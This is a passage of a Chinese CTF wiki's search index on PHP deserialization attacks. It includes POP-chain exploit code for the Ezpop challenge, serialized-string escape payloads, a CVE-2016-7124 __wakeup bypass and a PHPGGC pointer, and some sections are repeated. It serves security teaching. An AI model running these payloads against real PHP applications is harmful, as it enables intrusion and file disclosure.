structor\uff09\uff1b_toString\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u65f6\u4f7f\u7528\u3002</p> <pre><code>&lt;?php\nclass test{    public $variable = 'BUZZ';    public $variable2 = 'OTHER';    public function printvariable()    {        echo $this-&gt;variable.'&lt;br /&gt;';    }    public function __construct()    {        echo '__construct'.'&lt;br /&gt;';    }    public function __destruct()    {        echo '__destruct'.'&lt;br /&gt;';    }    public function __wakeup()    {        echo '__wakeup'.'&lt;br /&gt;';    }    public function __sleep()    {        echo '__sleep'.'&lt;br /&gt;';        return array('variable','variable2');    }}\n//\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56de\u8c03\u7528__construct$object = new test();//\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4f1a\u8c03\u7528__sleep$serialized = serialize($object);//\u8f93\u51fa\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32print 'Serialized:'.$serialized.'&lt;br /&gt;';//\u91cd\u5efa\u5bf9\u8c61\uff0c\u4f1a\u8c03\u7528__wakeup$object2 = unserialize($serialized);//\u8c03\u7528printvariable,\u4f1a\u8f93\u51fa\u6570\u636e(BUZZ)$object2-&gt;printvariable();//\u811a\u672c\u7ed3\u675f\uff0c\u4f1a\u8c03\u7528__destruct?&gt;//test4.php\nPlain Text\n</code></pre> <p>\u5f97\u5230\u7684\u7ed3\u679c\u662f\u8fd9\u6837\u7684\uff1a\uff08\u53ef\u4ee5\u81ea\u5df1\u53bb\u8bd5\u8bd5\uff09</p> <p></p> <p>\u53cd\u5e8f\u5217\u5316\u5728\u7279\u5b9a\u6761\u4ef6\u4e0b\u53ef\u4ee5\u91cd\u5efaphp\u5bf9\u8c61\u5e76\u6267\u884cphp\u5bf9\u8c61\u4e2d\u67d0\u4e9bmagic\u51fd\u6570\u3002</p> <p>\u8fd9\u4fbf\u5c31\u662f\u6f0f\u6d1e\u6765\u6e90\uff0c\u6765\u81ea\u8fd9\u4e9b\u81ea\u52a8\u8c03\u7528\u7684__magic\u51fd\u6570,\u5982\u679c\u5176\u4e2d\u6709\u67d0\u4e9b\u53c2\u6570\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u8df3\u5230\u67d0\u4e2a\u4ee3\u7801\u6a21\u5757\u4e4b\u4e2d\u3002</p> <p></p> <p>\u5269\u4e0b\u7684\u9047\u89c1\u4e86\u4e5f\u53ef\u4ee5\u5728\u6b64\u8865\u5145\uff1a</p> <p>__tostring:\u5f53\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u65f6\u8c03\u7528\u3002</p> <p>\u8fd9\u4e9b\u662f\u5e38\u89c1\u7684\u3002</p>"},{"location":"web/serialize/PHP/php_serialize/#_2","title":"\u521d\u7ea7\u7684\u6f0f\u6d1e\u6848\u4f8b","text":"<pre><code>&lt;?php\nclass A{\nvar $test = \"demo\";\nfunction __destruct(){\necho $this-&gt;test;\n}\n}\n$a = $_GET['test'];\n$a_unser = unserialize($a);\n?&gt;\nPlain Text\n</code></pre> <p>\u5f88\u7ecf\u5178\uff0cGET\u5f97\u5230test\u53c2\u6570\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\uff0c\u91cc\u9762\u6709\u4e2a__destruct---\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u89e6\u53d1\u3002</p> <p>\u5982\u679c\u6211\u4eec\u8f93\u5165<code>?test=O:1:\"A\":1:{s:4:\"test\";s:4:\"test\";}</code></p> <p>\u4e5f\u5c31\u662f\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u7684\u7ed3\u679c\u3002</p> <pre><code>&lt;?php\nclass A{\nvar $test = \"demo\";\nfunction __destruct(){\necho $this-&gt;test;\n}\n}\n$a= new A();\n$a-&gt;test=\"test\";\necho serialize($a);\n?&gt;\nPlain Text\n</code></pre> <p>\u5f53\u8fd9\u6bb5\u4ee3\u7801\u6267\u884c\u5b8c\u6210\u540e\u4f1a\u8c03\u7528__destruct,\u5e76\u4e14echo  \"test\"\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4f1a\u53d1\u73b0\u76f8\u5f53\u4e8e$test\u53d8\u6210\u4e86\u6211\u4eec\u7684\u53ef\u63a7\u53c2\u6570\uff0c\u8fd9\u91cc\u7684__destrcut\u4e0b\u7684\u51fd\u6570\u662fecho,\u90a3\u5982\u679c\u662feval(){\u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c}\u5462\uff1f\u540e\u679c\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u6211\u4eec\u7684\u4ee3\u7801\u3002\u5c06test\u6539\u4e3acat /flag.</p> <p>unserialize\u6f0f\u6d1e\u4f9d\u8d56\u51e0\u4e2a\u6761\u4ef6\uff1a</p> <p>unserialize\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7</p> <p>\u811a\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff08__construct()\uff09\u3001\u6790\u6784\u51fd\u6570\uff08__destruct()\uff09\u3001__wakeup()\u51fd\u6570\u4e2d\u6709\u5411php\u6587\u4ef6\u4e2d\u5199\u6570\u636e\u7684\u64cd\u4f5c\u7684\u7c7b</p> <p>\u6240\u5199\u7684\u5185\u5bb9\u9700\u8981\u6709\u5bf9\u8c61\u4e2d\u7684\u6210\u5458\u53d8\u91cf\u7684\u503c</p>"},{"location":"web/serialize/PHP/php_serialize/#_3","title":"\u5e8f\u5217\u5316\u4e2d\u7c7b\u7684\u7c7b\u578b","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u5c11\u89c1\u7684\u3002</p> <p>\u5173\u4e8e\u5e8f\u5217\u5316\u4e2d\u7c7b\u7684\u7c7b\u578b\uff1aPUBLIC,PRIVATE,PROTECTED</p> <p>\u5176\u4e2d\u5728\u63d0\u4ea4\u6570\u636e\u7684\u65f6\u5019\uff1a</p> <p>public\u4e0d\u9700\u8981\u8fdb\u884c\u8fc7\u591a\u4fee\u9970</p> <p>private\u9700\u8981%00Name%00</p> <p>protected\u5219\u662f\u9700\u8981\uff1a %00*%00username\u7684\u5f62\u5f0f</p> <p>\u4e5f\u5c31\u662f\u8bf4</p> <pre><code>O:4:\"Name\":2\uff1a{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\nPlain Text\n</code></pre> <p>\u5982\u679c\u662fprivate\u7c7b\u578b\u7684\u8bdd\u5e94\u8be5\u5199\u6210</p> <pre><code>O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\nPlain Text\n</code></pre> <p>\u4e00\u822c\u6765\u8bf4\u6211\u4f1a\u5148\u5b9a\u4e49\u6210public\u7136\u540e\u624b\u52a8\u6dfb\u52a0\u3002</p> <p>\u4f8b\u9898\uff1a</p> <p>[\u6781\u5ba2\u5927\u6311\u6218 2019]PHP</p>"},{"location":"web/serialize/PHP/php_serialize/#pop","title":"POP\u94fe","text":"<p>\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\uff0c\u8fd9\u4e0d\u662f\u4e00\u79cd\u6280\u672f\uff0c\u800c\u662f\u4e00\u79cd\u601d\u7ef4\u3002</p> <p>\u6240\u4ee5\u8bf4\u4e0d\u592a\u597d\u4ece\u7406\u8bba\u4e0a\u6765\u89e3\u91ca\u3002</p> <p>\u7ed9\u4e2a\u4f8b\u9898\uff1a</p> <p>[MRCTF2020]Ezpop</p> <p>\u4e0b\u9762\u662f\u5feb\u4e50\u7684\u4ee3\u7801\u5ba1\u8ba1\u73af\u8282</p> <pre><code>Welcome to index.php\n&lt;?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\nprotected  $var;\npublic function append($value){\ninclude($value);\n}\npublic function __invoke(){\n$this-&gt;append($this-&gt;var);\n}\n}\nclass Show{\npublic $source;\npublic $str;\npublic function __construct($file='index.php'){\n$this-&gt;source = $file;\necho 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";\n}\npublic function __toString(){\nreturn $this-&gt;str-&gt;source;\n}\npublic function __wakeup(){\nif(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\necho \"hacker\";\n$this-&gt;source = \"index.php\";\n}\n}\n}\nclass Test{\npublic $p;\npublic function __construct(){\n$this-&gt;p = array();\n}\npublic function __get($key){\n$function = $this-&gt;p;\nreturn $function();\n}\n}\nif(isset($_GET['pop'])){\n@unserialize($_GET['pop']);\n}\nelse{\n$a=new Show;\nhighlight_file(__FILE__);\n}\nPlain Text\n</code></pre> <p>\u5ba1\u8ba1\u5b8c\u4ee3\u7801\u5e94\u8be5\u662finclude\u7684\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6765\u8bfb\u53d6\u6211\u4eec\u7684flag\uff0c\u4f46\u73b0\u5728\u7684\u95ee\u9898\u662f\u6240\u9700\u8981\u4f7f\u7528\u7684\u7c7b\u4e3aModifier,\u6211\u4eec\u6240\u80fd\u63a7\u5236\u7684\u53ea\u662f\u4e00\u4e2a\u7b80\u7b80\u5355\u5355\u7684pop\uff0c\u90a3\u4e48\u8be5\u600e\u6837\u624d\u80fd\u8fdb\u5165\u8fd9\u4e2a\u7c7b\u4e4b\u4e2d\uff1f</p> <p>\u4e0b\u9762\u662f\u4e2a\u4eba\u7684\u7406\u89e3\u3002</p> <p>\u9996\u5148\u8c03\u7528unserialize()\u51fd\u6570\u7684\u65f6\u5019\u89e6\u53d1\u7c7b\u4e2d\u7684__wakeup()\uff0cWakeup()\u8c03\u7528\u4e86\u5b57\u7b26\u5339\u914d\u8fc7\u6ee4\uff0c\u5c06\u7c7b\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u8c03\u7528\uff0c\u5219\u53c8\u4f1a\u81ea\u52a8\u8c03\u7528__tostring(),\u5982\u679c\u5c06\u5176\u5b9e\u4f8b\u5316\u4e3aTEST\uff0c\u5219\u4f1a\u8fd4\u56deTEST\u4e2d\u7684source\u5c5e\u6027\uff0c\u4f46\u662fTEST\u4e2d\u4e0d\u542b\u6709source \uff0c\u90a3\u4e48\u5c31\u4f1a\u89e6\u53d1\u5728\u5f53\u524d\u7c7b\u4e0d\u5305\u542b\u5c5e\u6027\u4e2d\u81ea\u52a8\u8c03\u7528\u7684__get(),\u5c06\u5176\u5b9e\u4f8b\u5316\u4e3aModifier\u7c7b\uff0c\u89e6\u53d1__invoke()\u65b9\u6cd5\uff0c\u6700\u7ec8\u5229\u7528include\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u5230flag.php\u3002</p> <p>\u8fd9\u5c31\u662fpop\u94fe</p> <p>\u4e5f\u5c31\u662funserilize-&gt;__wakeup-&gt;__tostring-&gt;__get-&gt;__invoke-&gt;include\u6587\u4ef6\u5305\u542b</p> <p>\u81f3\u4e8e\u4ee3\u7801\u7684\u5199\u6cd5\uff1a</p> <pre><code>&lt;?php\nclass Modifier {\nprotected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n}\nclass Test{\npublic $p;\n}\nclass Show{\npublic $source;\npublic $str;\npublic function __construct(){\n$this-&gt;str = new Test();\n}\n}\n$a = new Show();//\u6b64\u65f6source(show)-&gt;str\n$a-&gt;source = new Show();//source(show)-&gt;str\u4e4b\u540e\u89e6\u53d1__tostring\u7136\u540e\u8bbf\u95eesource(test)\u89e6\u53d1__get\n$a-&gt;source-&gt;str-&gt;p = new Modifier();//__get\u8fd4\u56de\u7684p\u89e6\u53d1__invoke\necho serialize($a);\n?&gt;\nPlain Text\n</code></pre> <p>\u6700\u540e\u7ed3\u679c\u56e0\u4e3a\u662fprivate\u6240\u4ee5\u9700\u8981%00\u6765\u586b\u5145\u3002</p> <p>\u5982\u679c\u770b\u4e0d\u61c2\u7684\u8bdd\u53ef\u4ee5\u5c1d\u8bd5\u624b\u7ed8\u4e00\u4e0b\u7c7b\u6307\u5411\u7684\u7ed3\u6784\uff0c\u5e94\u8be5\u662f\u6ca1\u4ec0\u4e48\u5927\u95ee\u9898\u3002</p> <p>\u6700\u540e\uff0c\u8fd9\u5e94\u8be5\u662f\u78b0\u5230\u7684php\u53cd\u5e8f\u5217\u5316\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u627epop\u94fe\u53ef\u4ee5\u8bf4\u662f\u8fd9\u7c7b\u9898\u76ee\u91cc\u9762\u6700\u6709\u610f\u601d\u7684\u4e1c\u897f\u4e86\u3002</p> <p>\u5982\u679c\u60f3\u6311\u6218\u7684\u5316\u53ef\u4ee5\u5eb7\u5eb7\u3002</p> <p>[CISCN2019 \u603b\u51b3\u8d5b Day1 Web4]Laravel1</p> <p>\u8fd9\u79cd\u5927\u6846\u67b6\u4e0b\u7684\u6f0f\u6d1e\u4e00\u822c\u90fd\u662f\u5728\u7f51\u4e0a\u80fd\u627e\u5f97\u5230\u6e90\u7801\u6216\u8005\u76f4\u63a5\u662f\u6f0f\u6d1e\u3002\u8fd9\u79cd\u5c31\u529f\u5229\u4e00\u70b9\uff0c\u56e0\u4e3a\u522b\u4eba\u6316\u4e86\u5f88\u4e45\u624d\u627e\u5230\u7684\u6f0f\u6d1e\u51e0\u4e2a\u5c0f\u65f6\u89e3\u51b3\u662f\u4e0d\u5927\u73b0\u5b9e......\u7ecf\u5e38\u4f1a\u78b0\u5230\u7684\u8fd8\u6709THINKPHP5\u7cfb\u7684\u6f0f\u6d1e\u3002 \u4e00\u9053\u975e\u5e38\u957f\u957f\u957f\u7684\u53cd\u5e8f\u5217\u5316\u9898\u76ee\uff0c\u4f46\u662f\u4e5f\u5e76\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u601d\u8def\uff0c</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p>"},{"location":"web/serialize/PHP/php_serialize/#_4","title":"\u5b57\u7b26\u9003\u9038","text":""},{"location":"web/serialize/PHP/php_serialize/#_5","title":"\u5b57\u7b26\u589e\u52a0\u578b","text":"<p>\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u4ee5<code>\";}</code>\u7ed3\u675f\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u628a<code>\";}</code>\u5e26\u5165\u9700\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\uff08\u9664\u4e86\u7ed3\u5c3e\u5904\uff09\uff0c\u5c31\u80fd\u8ba9\u53cd\u5e8f\u5217\u5316\u63d0\u524d\u95ed\u5408\u7ed3\u675f\uff0c\u540e\u9762\u7684\u5185\u5bb9\u5c31\u4e22\u5f03\u4e86\u3002</p> <p>\u8bf4\u8d77\u6765\u6709\u70b9\u96be</p> <pre><code>&lt;?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n$c=unserialize($res);\necho $c-&gt;pass;\n?&gt;\nPHP\n</code></pre> <p>\u4ee3\u7801\u7684\u903b\u8f91\u662f\u5e8f\u5217\u5316\uff0c\u7136\u540e\u5c06bb\u66ff\u6362\u4e3accc\u3002</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\u5982\u679c\u6211\u4eec\u4f20\u5165\uff1a$name=aaaabb,\u8fd9\u6837\u4e00\u5b9a\u4f1a\u662f\u62a5\u9519\u7684\uff1a</p> <p></p> <p>php\u662f\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b83\u89e3\u6790\u4e0d\u4e86\uff1aO:1:\"A\":2:{s:4:\"name\";s:6:\"aaaaccc\";s:4:\"pass\";s:6:\"123456\";}</p> <p>s\u540e\u9762\u7684aaaacc+c\u6700\u540e\u7684c\u662f\u6ca1\u529e\u6cd5\u89e3\u6790\u7684\u3002</p> <p>\u6839\u636ephp\u89e3\u6790\u5e8f\u5217\u5316\u5b57\u7b26\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u6211\u4eec\u5411name\u4e2d\u4f20\u8f93\u6570\u636e\u4e3a\";s:4:\"pass\";s:6:\"hacker\";}\u3002</p> <p>name\u88ab\u5e8f\u5217\u5316\u540e\u7684\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u540ename\u4ecd\u7136\u4e3a\";s:4:\"pass\";s:6:\"hacker\";}</p> <p></p> <p>O:1:\"A\":2:{s:4:\"name\";s:27:\"\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}</p> <p>\u53ef\u89c1\u5728\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u5728\u7ecf\u8fc7filter\u51fd\u6570\u8fc7\u6ee4\u524d\uff0cs\u4e3a6\uff0c\u5185\u5bb9\u4e3aaaaabb\uff1b\u7ecf\u8fc7filter\u8fc7\u6ee4\u540e\uff0cs\u4ecd\u7136\u4e3a6\uff0c\u4f46\u5185\u5bb9\u53d8\u4e3a\u4e86aaaaccc\uff0c\u957f\u5ea6\u53d8\u6210\u4e867\uff0c\u6839\u636e\u53cd\u5e8f\u5217\u5316\u8bfb\u53d6\u53d8\u91cf\u7684\u539f\u5219\u6765\u8bb2\uff0c\u6b64\u65f6\u7684name\u80fd\u8bfb\u53d6\u5230\u7684\u53ea\u662faaaacc\uff0c\u672b\u5c3e\u5904\u7684\u90a3\u4e2ac\u662f\u8bfb\u53d6\u4e0d\u5230\u7684\uff0c\u8fd9\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u9003\u9038\u3002\u5f53\u6211\u4eec\u6dfb\u52a0\u591a\u4e2abb\uff0c\u6bcf\u6dfb\u52a0\u4e00\u4e2abb\u6211\u4eec\u5c31\u80fd\u9003\u9038\u4e00\u4e2a\u5b57\u7b26\uff0c\u90a3\u6211\u4eec\u5c06\u9003\u9038\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u586b\u5145\u6210\u6211\u4eec\u8981\u53cd\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u957f\u5ea6\u7684\u8bdd\u90a3\u5c31\u53ef\u4ee5\u63a7\u5236\u53cd\u5e8f\u5217\u5316\u7684\u7ed3\u679c\u4ee5\u53ca\u7c7b\u91cc\u9762\u7684\u53d8\u91cf\u503c\u4e86\u3002</p> <p>\u8fd9\u91cc\u6709\u4e2a27\uff0c\u6240\u4ee5\u6211\u4eec\u6dfb\u52a027\u4e2abb,\u76f8\u5f53\u4e8e\u66ff\u6362ccc\u540e\u5c31\u80fd\u591f\u9003\u9038\u6389\u8fd9\u4e2a27\uff0c\u7136\u540e\u7531\u6211\u4eec\u8f93\u5165\u7684\uff1b}\u95ed\u5408\u6389\u53cd\u5e8f\u5217\u5316\uff0c\u5ffd\u7565\u6389\u539f\u6765\u7684\u6570\u636e\u3002\u5b8c\u6210\u5b57\u7b26\u9003\u9038\u3002</p>"},{"location":"web/serialize/PHP/php_serialize/#_6","title":"\u5b57\u7b26\u51cf\u5c11\u578b","text":"<p>\u5f88\u7c7b\u4f3c\uff0c\u5982\u679c\u4e0a\u9762\u7684\u80fd\u591f\u770b\u61c2\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u81ea\u5df1\u5e94\u8be5\u4e5f\u5c31\u80fd\u5199\u51fa\u6765\u3002</p> <pre><code>&lt;?phpfunction str_rep($string){ return preg_replace( '/php|test/','', $string);}\n$test['name'] = $_GET['name'];$test['sign'] = $_GET['sign']; $test['number'] = '2020';$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);echo '&lt;br&gt;';print(\"name:\".$fake['name'].'&lt;br&gt;');print(\"sign:\".$fake['sign'].'&lt;br&gt;');print(\"number:\".$fake['number'].'&lt;br&gt;');?&gt;\nPHP\n</code></pre> <p>\u5e8f\u5217\u5316-&gt;\u66ff\u6362-&gt;\u53cd\u5e8f\u5217\u5316</p> <p>\u6211\u4eec\u8981\u4fee\u6539number\u7684\u503c\uff0c\u5c31\u8981\u5728sign\u4e2d\u52a0\u5165<code>\";s:6:\"number\";s:4:\"2020\";}</code></p> <p></p> <p>\u53ef\u4ee5\u81ea\u5df1\u6765\u5c1d\u8bd5\u3002\u770b\u4e0d\u61c2\u81ea\u5df1var_dump</p>"},{"location":"web/serialize/PHP/php_serialize/#cve-2016-7124","title":"CVE-2016-7124","text":"<p>\u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c</p> <pre><code>O:4:\"test\":1:{s:4:\"name\";s:5:\"fairy\";}//\u8fd9\u4e00\u4e32\nPHP\n</code></pre> <p>\u5982\u679c\u6539\u6210                    |</p> <pre><code>O:4:\"test\":2:{s:4:\"name\";s:5:\"fairy\";}\nPlain Text\n</code></pre> <p>\u5c31\u4f1a\u8df3\u8fc7__wakeup()\u9b54\u672f\u65b9\u6cd5\u3002\uff08\u4f8b\u5b50\u5c31\u4e0d\u653e\u4e86\uff09</p>"},{"location":"web/serialize/PHP/php_serialize/#phpggc","title":"PHPGGC\u53cd\u5e8f\u5217\u5316\u5de5\u5177","text":"<p>\u8fd9\u4e2a\u5de5\u5177\u662f\u6700\u8fd1\u624d\u53d1\u73b0\u7684\uff0c\u5148\u7b49\u6211\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u56de\u987e\u4e00\u4e0b\u518d\u5206\u4eab\u7ed9\u5927\u5bb6\u3002\u53ef\u4ee5\u8fd0\u7528\u5728\u76ee\u524d\u6bd4\u8f83\u4e3b\u6d41\uff08\u800c\u53c8\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff09\u7684\u6846\u67b6\u4e2d\uff0c\u6bd4\u5982\u8bf4thinkphp(\u611f\u89c9\u90fd\u662f\u8001\u6bdb\u75c5\u4e86),laravel......</p> <p>\u7136\u540e\u7528\u547d\u540d\u7a7a\u95f4\u5199\u7684\u53cd\u5e8f\u5217\u5316\u672c\u4eba\u4e5f\u8fd8\u662f\u4e0d\u592a\u4f1a\u3002</p> <p>\u4ece0\u52301\u638c\u63e1\u53cd\u5e8f\u5217\u5316\u5de5\u5177\u4e4bPHPGGC - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/5450</p>"},{"location":"web/serialize/PHP/php_serialize/#phpggc_1","title":"PHPGGC\u53cd\u5e8f\u5217\u5316\u5de5\u5177","text":"<p>\u8fd9\u4e2a\u5de5\u5177\u662f\u6700\u8fd1\u624d\u53d1\u73b0\u7684\uff0c\u5148\u7b49\u6211\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u56de\u987e\u4e00\u4e0b\u518d\u5206\u4eab\u7ed9\u5927\u5bb6\u3002\u53ef\u4ee5\u8fd0\u7528\u5728\u76ee\u524d\u6bd4\u8f83\u4e3b\u6d41\uff08\u800c\u53c8\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff09\u7684\u6846\u67b6\u4e2d\uff0c\u6bd4\u5982\u8bf4thinkphp(\u611f\u89c9\u90fd\u662f\u8001\u6bdb\u75c5\u4e86),laravel......</p> <p>\u7136\u540e\u7528\u547d\u540d\u7a7a\u95f4\u5199\u7684\u53cd\u5e8f\u5217\u5316\u672c\u4eba\u4e5f\u8fd8\u662f\u4e0d\u592a\u4f1a\u3002</p> <p>\u4ece0\u52301\u638c\u63e1\u53cd\u5e8f\u5217\u5316\u5de5\u5177\u4e4bPHPGGC - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/5450</p> <p>\u653e\u4e0a\u6765\u4e86\uff0c\u81ea\u5df1\u8bd5\u8bd5\u7684\u8bdd\u53ef\u4ee5[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u548c\u8bb0\u5f97XCTF\u4e0a\u9762\u7684\u4e00\u4e2athinkphp5\u7684\u9898\u76ee</p> <p>https://github.com/wh1t3p1g/phpggc</p> <p>\u4f5c\u8005\u7684\u4ecb\u7ecd\u3002</p> <p>\u7136\u540e\u8fd9\u662f\u672c\u4eba\u5c1d\u8bd5\u7684\u5b9e\u73b0</p> <p>[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u62ff\u5230\u9898\u76ee\u672c\u80fd\u7684\u626b\u63cf\u4e00\u4e0b\u540e\u53f0\u53d1\u73b0\u4e86\u8fd9\u662f\u4e00\u4e2athinkphp6.x\u7684\u6846\u67b6\uff08\u6e90\u7801\u5b9e\u5728\u662f\u592a\u957f\u4e86\uff01\uff09 \u6240\u4ee5\u5f88\u5927\u6982\u7387\u662f\u548cciscn\u90a3\u9053laravel\u4e00\u6837\uff0c\u4f1a\u6709\u6bd4\u8f83\u957f\u7684\u5206\u6790\u94fe \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e00\u4e0b\u5de5\u5177phpggc chmod +x phpggc ./phpg</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p> <p>\u653e\u4e0a\u6765\u4e86\uff0c\u81ea\u5df1\u8bd5\u8bd5\u7684\u8bdd\u53ef\u4ee5[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u548c\u8bb0\u5f97XCTF\u4e0a\u9762\u7684\u4e00\u4e2athinkphp5\u7684\u9898\u76ee</p> <p>https://github.com/wh1t3p1g/phpggc</p> <p>\u4f5c\u8005\u7684\u4ecb\u7ecd\u3002</p> <p>\u7136\u540e\u8fd9\u662f\u672c\u4eba\u5c1d\u8bd5\u7684\u5b9e\u73b0</p> <p>[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u62ff\u5230\u9898\u76ee\u672c\u80fd\u7684\u626b\u63cf\u4e00\u4e0b\u540e\u53f0\u53d1\u73b0\u4e86\u8fd9\u662f\u4e00\u4e2athinkphp6.x\u7684\u6846\u67b6\uff08\u6e90\u7801\u5b9e\u5728\u662f\u592a\u957f\u4e86\uff01\uff09 \u6240\u4ee5\u5f88\u5927\u6982\u7387\u662f\u548cciscn\u90a3\u9053laravel\u4e00\u6837\uff0c\u4f1a\u6709\u6bd4\u8f83\u957f\u7684\u5206\u6790\u94fe \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e00\u4e0b\u5de5\u5177phpggc chmod +x phpggc ./phpg</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p>"},{"location":"web/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/","title":"session\u53cd\u5e8f\u5217\u5316\u8df3\u677f","text":"<p>\u548c\u6587\u4ef6\u5305\u542b</p> <p>\u5728php.ini\u6709\u4ee5\u4e0b\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879</p> <pre><code>1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\nPlain Text\n</code></pre> <pre><code>enabled=on\u8868\u793aupload_progress\u529f\u80fd\u5f00\u59cb\uff0c\u4e5f\u610f\u5473\u7740\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \uff1bcleanup=on\u8868\u793a\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u9009\u9879\u975e\u5e38\u91cd\u8981\uff1bname\u5f53\u5b83\u51fa\u73b0\u5728\u8868\u5355\u4e2d\uff0cphp\u5c06\u4f1a\u62a5\u544a\u4e0a\u4f20\u8fdb\u5ea6\uff0c\u6700\u5927\u7684\u597d\u5904\u662f\uff0c\u5b83\u7684\u503c\u53ef\u63a7\uff1bprefix+name\u5c06\u8868\u793a\u4e3asession\u4e2d\u7684\u952e\u540d.session.use_strict_mode=off\u8fd9\u4e2a\u9009\u9879\u9ed8\u8ba4\u503c\u4e3aoff\uff0c\u8868\u793a\u6211\u4eec\u5bf9Cookie\u4e2dsessionid\u53ef\u63a7\u3002\nPlain Text\n</code></pre> 